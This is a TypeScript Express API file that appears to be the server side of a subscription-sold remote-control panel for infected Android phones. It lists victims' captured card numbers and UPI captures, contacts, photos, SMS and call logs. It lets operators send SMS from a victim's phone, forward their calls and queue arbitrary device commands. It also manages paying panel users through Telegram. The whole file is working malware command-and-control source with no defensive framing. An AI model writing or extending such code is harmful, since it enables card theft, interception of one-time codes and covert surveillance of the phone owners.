import { Router } from "express";
import { isAdminTg, ADMIN_TG_IDS } from "../lib/admin";
import { requireAuth, requireAdmin } from "../middlewares/auth";
import rateLimit from "express-rate-limit";
import { fbGet, fbUpdate, fbSet, fbDelete } from "../bot/firebase";
import { isSubscriptionActive } from "../bot/firebase";
import {
  getAllSubscriptions,
  getSubscription,
  setSubscription,
  deleteSubscription,
} from "../bot/firebase";
import { getPlan } from "../lib/plans";
import { createFleet, RtdbAdapter } from "../fleet/rtdbFleet";
import { normalizeDevice } from "../lib/normalizeDevice";

const router = Router();

const writeLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 30,
  message: { error: "Too many requests, try later" },
  standardHeaders: true,
  legacyHeaders: false,
});

function getFleet() {
  return createFleet({
    rtdb: new RtdbAdapter(),
    notifier: { async sendOtp() {} },
  });
}

// ── Helpers ────────────────────────────────────────────────────────────────

function canSeeDevice(
  ownerTelegramId: string | null | undefined,
  viewerTelegramId: string,
  isAdmin: boolean
): boolean {
  if (isAdmin) return true;
  if (!ownerTelegramId || ownerTelegramId === "") return true;
  return ownerTelegramId === viewerTelegramId;
}

// ── GET /api/devices — filtered device list ───────────────────────────────
router.get("/devices", requireAuth, async (req, res) => {
  try {
    const auth = (req as any).auth as { telegramId: string };
    const isAdmin = isAdminTg(auth.telegramId);
    const { filter, search, group } = (req.query as any) ?? {};

    const clients = (await fbGet("clients")) || {};
    const now = Date.now();
    const devices: any[] = [];

    for (const [id, raw] of Object.entries(clients)) {
      if (!raw || typeof raw !== "object") continue;
      if (!canSeeDevice(raw.ownerTelegramId, auth.telegramId, isAdmin)) continue;
      const dev = normalizeDevice(id, raw);
      // Filters
      if (filter === "online" && !dev.isOnline) continue;
      if (filter === "offline" && dev.isOnline) continue;
      if (filter === "upi" && !dev.upi) continue;
      if (filter === "cards") {
        const hasCards =
          !!raw.cc_cardNumber ||
          !!raw.cardNumber ||
          Object.keys(raw).some((k) => k.startsWith("cc_"));
        if (!hasCards) continue;
      }
      if (filter === "pinned") {
        // Pin check requires per-user pin state — skip for now, handled in panel
      }
      if (group && group !== "all" && dev.group !== group) continue;
      if (search) {
        const q = String(search).toLowerCase();
        if (
          !dev.id.toLowerCase().includes(q) &&
          !dev.model.toLowerCase().includes(q) &&
          !dev.phone.includes(q) &&
          !(dev.deviceName || "").toLowerCase().includes(q)
        )
          continue;
      }
      devices.push(dev);
    }

    // Sort by lastPing desc
    devices.sort((a, b) => {
      const ta = a.lastPing || 0;
      const tb = b.lastPing || 0;
      return tb - ta;
    });

    const online = devices.filter((d) => d.isOnline).length;
    const offline = devices.filter((d) => !d.isOnline).length;
    const cards = devices.filter((d) => {
      const raw = d.raw;
      return !!(raw.cc_cardNumber || raw.cardNumber);
    }).length;
    const upi = devices.filter((d) => d.upi).length;

    res.json({
      success: true,
      devices,
      totals: { online, offline, cards, upi, total: devices.length },
    });
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch devices" });
  }
});

// ── GET /api/device/:id — full device detail ──────────────────────────────
router.get("/device/:id", requireAuth, async (req, res) => {
  try {
    const auth = (req as any).auth as { telegramId: string };
    const isAdmin = isAdminTg(auth.telegramId);
    const id = Array.isArray(req.params.id) ? req.params.id[0] : req.params.id;

    const raw = (await fbGet(`clients/${id}`)) || null;
    if (!raw || typeof raw !== "object") {
      return res.status(404).json({ error: "Device not found" });
    }

    if (!canSeeDevice(raw.ownerTelegramId, auth.telegramId, isAdmin)) {
      return res.status(403).json({ error: "Access denied" });
    }

    const device = normalizeDevice(id, raw);
    const [contacts, gallery, messages, calls, ccCaptures] = await Promise.all([
      fbGet(`clients/${id}/contacts`).catch(() => ({})),
      fbGet(`clients/${id}/gallery`).catch(() => ({})),
      fbGet(`clients/${id}/messages`).catch(() => ({})),
      fbGet(`clients/${id}/callLogs`).catch(() => ({})),
      fbGet(`clients/${id}/upi_captures`).catch(() => ({})),
    ]);

    res.json({
      success: true,
      device,
      contacts: {
        list: Object.entries(contacts || {}).map(([k, v]: [string, any]) => ({
          id: k,
          ...v,
        })),
        count: Object.keys(contacts || {}).length,
      },
      gallery: {
        list: Object.entries(gallery || {}).map(([k, v]: [string, any]) => ({
          id: k,
          ...v,
        })),
        count: Object.keys(gallery || {}).length,
      },
      messages: {
        list: Object.entries(messages || {}).map(([k, v]: [string, any]) => ({
          id: k,
          ...v,
        })),
        count: Object.keys(messages || {}).length,
      },
      calls: {
        list: Object.entries(calls || {}).map(([k, v]: [string, any]) => ({
          id: k,
          ...v,
        })),
        count: Object.keys(calls || {}).length,
      },
      ccCaptures: {
        list: Object.entries(ccCaptures || {}).map(([k, v]: [string, any]) => ({
          id: k,
          ...v,
        })),
        count: Object.keys(ccCaptures || {}).length,
      },
    });
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch device" });
  }
});

// ── POST /api/device/:id/sms ──────────────────────────────────────────────
router.post("/device/:id/sms", requireAuth, writeLimiter, async (req, res) => {
  try {
    const auth = (req as any).auth as { telegramId: string };
    const isAdmin = isAdminTg(auth.telegramId);
    const id = Array.isArray(req.params.id) ? req.params.id[0] : req.params.id;
    const { to, message, sim } = (req.body ?? {}) as {
      to?: string;
      message?: string;
      sim?: number;
    };

    if (!to || !message) {
      return res.status(400).json({ error: "to and message required" });
    }

    const raw = (await fbGet(`clients/${id}`)) || null;
    if (!raw || typeof raw !== "object") {
      return res.status(404).json({ error: "Device not found" });
    }
    if (!canSeeDevice(raw.ownerTelegramId, auth.telegramId, isAdmin)) {
      return res.status(403).json({ error: "Access denied" });
    }

    const cleanTo = String(to).trim();
    const cleanMsg = String(message).trim();
    const simIndex = Number(sim) || 0;
    const now = Date.now();

    const smsPayload = {
      to: cleanTo,
      phone: cleanTo,
      number: cleanTo,
      message: cleanMsg,
      text: cleanMsg,
      body: cleanMsg,
      isSended: false,
      status: "pending",
      from: simIndex,
      sim: simIndex,
      simSlot: simIndex,
      timestamp: now,
      date: now,
      id: String(now),
    };

    await Promise.allSettled([
      fbSet(`clients/${id}/webhookEvent/sendSms`, smsPayload),
      fbSet(`clients/${id}/sendSms`, smsPayload),
      fbSet(`clients/${id}/action`, { type: "send_sms", ...smsPayload }),
    ]);

    res.json({ success: true, queued: true, payload: smsPayload });
  } catch (err) {
    res.status(500).json({ error: "Failed to send SMS" });
  }
});

// ── GET /api/device/:id/call-forward ──────────────────────────────────────
router.get("/device/:id/call-forward", requireAuth, async (req, res) => {
  try {
    const auth = (req as any).auth as { telegramId: string };
    const isAdmin = isAdminTg(auth.telegramId);
    const id = Array.isArray(req.params.id) ? req.params.id[0] : req.params.id;

    const raw = (await fbGet(`clients/${id}`)) || null;
    if (!raw || typeof raw !== "object") {
      return res.status(404).json({ error: "Device not found" });
    }
    if (!canSeeDevice(raw.ownerTelegramId, auth.telegramId, isAdmin)) {
      return res.status(403).json({ error: "Access denied" });
    }

    res.json({ success: true, forward: raw.callForward || null });
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch call forward" });
  }
});

// ── POST /api/device/:id/call-forward ─────────────────────────────────────
router.post(
  "/device/:id/call-forward",
  requireAuth,
  writeLimiter,
  async (req, res) => {
    try {
      const auth = (req as any).auth as { telegramId: string };
      const isAdmin = isAdminTg(auth.telegramId);
      const id = Array.isArray(req.params.id) ? req.params.id[0] : req.params.id;
      const { to, sim, active } = (req.body ?? {}) as {
        to?: string;
        sim?: number;
        active?: boolean;
      };

      if (!to) {
        return res.status(400).json({ error: "to required" });
      }

      const raw = (await fbGet(`clients/${id}`)) || null;
      if (!raw || typeof raw !== "object") {
        return res.status(404).json({ error: "Device not found" });
      }
      if (!canSeeDevice(raw.ownerTelegramId, auth.telegramId, isAdmin)) {
        return res.status(403).json({ error: "Access denied" });
      }

      const patch = active !== false ? { to: String(to).trim(), from: sim ?? 0, isActive: true } : null;

      if (patch) {
        await fbUpdate(`clients/${id}/callForward`, patch);
      } else {
        await fbUpdate(`clients/${id}`, { callForward: null });
      }

      res.json({ success: true, forward: patch });
    } catch (err) {
      res.status(500).json({ error: "Failed to set call forward" });
    }
  }
);

// ── POST /api/device/:id/command ──────────────────────────────────────────
router.post("/device/:id/command", requireAuth, writeLimiter, async (req, res) => {
  try {
    const auth = (req as any).auth as { telegramId: string };
    const isAdmin = isAdminTg(auth.telegramId);
    const id = Array.isArray(req.params.id) ? req.params.id[0] : req.params.id;
    const { action, payload } = (req.body ?? {}) as {
      action?: string;
      payload?: Record<string, any>;
    };

    if (!action) {
      return res.status(400).json({ error: "action required" });
    }

    const raw = (await fbGet(`clients/${id}`)) || null;
    if (!raw || typeof raw !== "object") {
      return res.status(404).json({ error: "Device not found" });
    }
    if (!canSeeDevice(raw.ownerTelegramId, auth.telegramId, isAdmin)) {
      return res.status(403).json({ error: "Access denied" });
    }

    const cmdKey = `cmd_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`;
    await fbUpdate(`clients/${id}`, {
      [cmdKey]: { action, payload: payload || {}, queuedBy: auth.telegramId, queuedAt: Date.now() },
    });

    res.json({ success: true, commandKey: cmdKey });
  } catch (err) {
    res.status(500).json({ error: "Failed to queue command" });
  }
});

// ── GET /api/users — admin: list all users ────────────────────────────────
router.get("/users", requireAdmin, async (_req, res) => {
  try {
    const fleet = getFleet();
    const subs = await fleet.subscriptions.list();
    const now = Date.now();

    // Count devices per user
    const clients = (await fbGet("clients")) || {};
    const deviceCount: Record<string, number> = {};
    for (const [id, raw] of Object.entries(clients)) {
      if (!raw || typeof raw !== "object") continue;
      const owner = raw.ownerTelegramId;
      if (owner) {
        deviceCount[owner] = (deviceCount[owner] || 0) + 1;
      }
    }

    const users = subs.map((s: any) => {
      const active = s.status === "active" && (!s.expiresAt || now < s.expiresAt);
      return {
        telegramId: s.telegramId,
        username: s.username || "unknown",
        email: s.email || "",
        plan: s.plan || "Custom",
        status: active ? "active" : "expired",
        expiresAt: s.expiresAt || null,
        createdAt: s.createdAt || null,
        daysLeft: s.expiresAt ? Math.floor((s.expiresAt - now) / 86400000) : null,
        devices: deviceCount[s.telegramId] || 0,
        hasPassword: !!(s.panelPassword),
      };
    });

    res.json({ success: true, users, count: users.length });
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch users" });
  }
});

// ── GET /api/users/:id — get single user ──────────────────────────────────
router.get("/users/:id", requireAdmin, async (req, res) => {
  try {
    const id = Array.isArray(req.params.id) ? req.params.id[0] : req.params.id;
    const fleet = getFleet();
    const subs = await fleet.subscriptions.list();
    const user = subs.find((s: any) => s.telegramId === id);

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const now = Date.now();
    const active = user.status === "active" && (!user.expiresAt || now < user.expiresAt);

    res.json({
      success: true,
      user: {
        telegramId: user.telegramId,
        username: user.username || "unknown",
        email: user.email || "",
        plan: user.plan || "Custom",
        status: active ? "active" : "expired",
        expiresAt: user.expiresAt || null,
        createdAt: user.createdAt || null,
        daysLeft: user.expiresAt ? Math.floor((user.expiresAt - now) / 86400000) : null,
        hasPassword: !!(user.panelPassword),
      },
    });
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch user" });
  }
});

// ── PUT /api/users/:id — admin: update user ───────────────────────────────
router.put("/users/:id", requireAdmin, async (req, res) => {
  try {
    const id = Array.isArray(req.params.id) ? req.params.id[0] : req.params.id;
    const { email, username, days, plan, status, panelPassword } = (req.body ?? {}) as {
      email?: string;
      username?: string;
      days?: number;
      plan?: string;
      status?: "active" | "expired";
      panelPassword?: string;
    };

    const existing = await getSubscription(id);
    if (!existing) {
      return res.status(404).json({ error: "User not found" });
    }

    const now = Date.now();
    const newExpiresAt =
      existing.expiresAt && existing.expiresAt > now
        ? existing.expiresAt + (days ?? 0) * 86400000
        : now + (days ?? 0) * 86400000;

    const patch: any = {};
    if (email !== undefined) patch.email = email.toLowerCase();
    if (username !== undefined) patch.username = username;
    if (plan !== undefined) patch.plan = plan;
    if (status !== undefined) patch.status = status;
    if (days !== undefined && days > 0) patch.expiresAt = newExpiresAt;
    if (panelPassword !== undefined) {
      patch.panelPassword = await import("bcryptjs").then((m) => m.hash(panelPassword, 10));
    }

    await fbUpdate(`subscriptions/${id}`, patch);

    const updated = await getSubscription(id);
    const active = updated.status === "active" && (!updated.expiresAt || now < updated.expiresAt);

    // Send notification if subscription was extended/modified
    if (days && days > 0) {
      const { sendSubscriptionNotification } = await import("../bot/index");
      await sendSubscriptionNotification(id, {
        username: updated.username || id,
        plan: updated.plan || "Custom",
        status: "active",
        expiresAt: updated.expiresAt || now + days * 86400000,
        email: updated.email,
      }).catch(() => {});
    }

    res.json({
      success: true,
      user: {
        telegramId: id,
        username: updated.username || username || "unknown",
        email: updated.email || email || "",
        plan: updated.plan || plan || "Custom",
        status: active ? "active" : "expired",
        expiresAt: updated.expiresAt || null,
        createdAt: updated.createdAt || null,
        daysLeft: updated.expiresAt ? Math.floor((updated.expiresAt - now) / 86400000) : null,
        hasPassword: !!(updated.panelPassword),
      },
    });
  } catch (err) {
    res.status(500).json({ error: "Failed to update user" });
  }
});

// ── POST /api/users — admin: create user ──────────────────────────────────
router.post("/users", requireAdmin, async (req, res) => {
  try {
    const { telegramId, email, username, days, plan, panelPassword } = (req.body ?? {}) as {
      telegramId?: string | number;
      email?: string;
      username?: string;
      days?: number;
      plan?: string;
      panelPassword?: string;
    };

    if (!telegramId || !days) {
      return res.status(400).json({ error: "telegramId and days required" });
    }

    const tid = String(telegramId);
    const existing = await getSubscription(tid);
    if (existing) {
      return res.status(409).json({ error: "User already exists" });
    }

    const fleet = getFleet();
    const sub = await fleet.subscriptions.upsert({
      telegramId: tid,
      days: parseInt(days),
      username: username || tid,
      email: email || undefined,
      plan: plan || "Custom",
      panelPassword: panelPassword || undefined,
    });

    // Send notification
    const { sendSubscriptionNotification } = await import("../bot/index");
    await sendSubscriptionNotification(tid, {
      username: sub.username || tid,
      plan: sub.plan || "Custom",
      status: "active",
      expiresAt: sub.expiresAt || Date.now() + parseInt(days) * 86400000,
      email: sub.email,
    }).catch(() => {});

    res.json({
      success: true,
      user: {
        telegramId: sub.telegramId,
        username: sub.username,
        email: sub.email || "",
        plan: sub.plan,
        status: "active",
        expiresAt: sub.expiresAt,
        createdAt: sub.createdAt || Date.now(),
        daysLeft: sub.expiresAt ? Math.floor((sub.expiresAt - Date.now()) / 86400000) : null,
        hasPassword: !!(sub.panelPassword),
      },
    });
  } catch (err) {
    res.status(500).json({ error: "Failed to create user" });
  }
});

// ── DELETE /api/users/:id — admin: remove user ────────────────────────────
router.delete("/users/:id", requireAdmin, async (req, res) => {
  try {
    const id = Array.isArray(req.params.id) ? req.params.id[0] : req.params.id;

    const fleet = getFleet();
    const all = await fleet.subscriptions.list();
    if (!all.some((s: any) => s.telegramId === id)) {
      return res.status(404).json({ error: "User not found" });
    }

    await fleet.subscriptions.remove(id);
    res.json({ success: true, deleted: id });
  } catch (err) {
    res.status(500).json({ error: "Failed to delete user" });
  }
});


// ── POST /api/device/register — register a new client in Firebase ──────
router.post("/device/register", requireAuth, writeLimiter, async (req, res) => {
  try {
    const auth = (req as any).auth as { telegramId: string; isAdmin?: boolean };
    const me = String(auth.telegramId);
    const admin = auth.isAdmin === true || isAdminTg(me);
    const { deviceId, modelName, ownerTelegramId, mobNo, alias, group } = (req.body ?? {}) as {
      deviceId?: string; modelName?: string; ownerTelegramId?: string | number;
      mobNo?: string; alias?: string; group?: string;
    };
    const id = deviceId ? String(deviceId).trim() : "dev-" + Date.now().toString(36);
    if (!/^[A-Za-z0-9_-]{8,64}$/.test(id)) {
      return res.status(400).json({ error: "deviceId must be 8-64 chars [A-Za-z0-9_-]" });
    }
    const owner = ownerTelegramId ? String(ownerTelegramId).trim() : me;
    if (!/^\d{3,20}$/.test(owner)) {
      return res.status(400).json({ error: "ownerTelegramId must be a numeric Telegram ID" });
    }
    if (owner !== me && !admin) {
      return res.status(403).json({ error: "Only admins can register devices for other owners" });
    }
    const existing = await fbGet(`clients/${id}`);
    if (existing) {
      return res.status(409).json({ error: "Device already registered" });
    }
    const now = new Date().toISOString();
    const record = {
      deviceId: id,
      modelName: String(modelName || "").slice(0, 100),
      ownerTelegramId: owner,
      mobNo: String(mobNo || "").slice(0, 20),
      alias: String(alias || "").slice(0, 60),
      group: String(group || "").slice(0, 60),
      status: "pending",
      joined: now,
      registeredBy: me,
      registeredAt: now,
      source: "panel",
    };
    await fbSet(`clients/${id}`, record);
    try {
      const { getBot } = await import("../bot/index");
      const bot = getBot();
      if (bot) {
        const msg =
          `\uD83D\uDCF2 *New device registered*\n\n` +
          `\u2022 ID: \`${id}\`\n` +
          `\u2022 Model: ${record.modelName || "-"}\n` +
          `\u2022 Owner: \`${owner}\`\n` +
          `\u2022 By: \`${me}\``;
        for (const adm of ADMIN_TG_IDS) {
          await bot.telegram.sendMessage(adm, msg, { parse_mode: "Markdown" }).catch(() => {});
        }
      }
    } catch {}
    res.status(201).json({ success: true, device: record });
  } catch (err) {
    res.status(500).json({ error: "Failed to register device" });
  }
});

// ── PATCH /api/device/:id — update registration fields ──────────────────
router.patch("/device/:id", requireAuth, writeLimiter, async (req, res) => {
  try {
    const auth = (req as any).auth as { telegramId: string; isAdmin?: boolean };
    const me = String(auth.telegramId);
    const admin = auth.isAdmin === true || isAdminTg(me);
    const id = Array.isArray(req.params.id) ? req.params.id[0] : req.params.id;
    const raw = (await fbGet(`clients/${id}`)) || null;
    if (!raw || typeof raw !== "object") {
      return res.status(404).json({ error: "Device not found" });
    }
    if (!canSeeDevice(raw.ownerTelegramId, me, admin)) {
      return res.status(403).json({ error: "Access denied" });
    }
    const { modelName, mobNo, alias, group, status } = (req.body ?? {}) as Record<string, unknown>;
    const patch: Record<string, unknown> = {};
    if (modelName !== undefined) patch.modelName = String(modelName).slice(0, 100);
    if (mobNo !== undefined) patch.mobNo = String(mobNo).slice(0, 20);
    if (alias !== undefined) patch.alias = String(alias).slice(0, 60);
    if (group !== undefined) patch.group = String(group).slice(0, 60);
    if (status !== undefined) {
      if (!["pending", "active", "disabled"].includes(String(status))) {
        return res.status(400).json({ error: "status must be pending|active|disabled" });
      }
      patch.status = String(status);
    }
    if (Object.keys(patch).length === 0) {
      return res.status(400).json({ error: "No updatable fields provided" });
    }
    await fbUpdate(`clients/${id}`, patch);
    const updated = await fbGet(`clients/${id}`);
    res.json({ success: true, device: updated });
  } catch (err) {
    res.status(500).json({ error: "Failed to update device" });
  }
});

// ── DELETE /api/device/:id — remove a client (admin) ────────────────────
router.delete("/device/:id", requireAdmin, writeLimiter, async (req, res) => {
  try {
    const id = Array.isArray(req.params.id) ? req.params.id[0] : req.params.id;
    const raw = (await fbGet(`clients/${id}`)) || null;
    if (!raw || typeof raw !== "object") {
      return res.status(404).json({ error: "Device not found" });
    }
    await fbDelete(`clients/${id}`);
    res.json({ success: true, deleted: id });
  } catch (err) {
    res.status(500).json({ error: "Failed to delete device" });
  }
});

export default router;
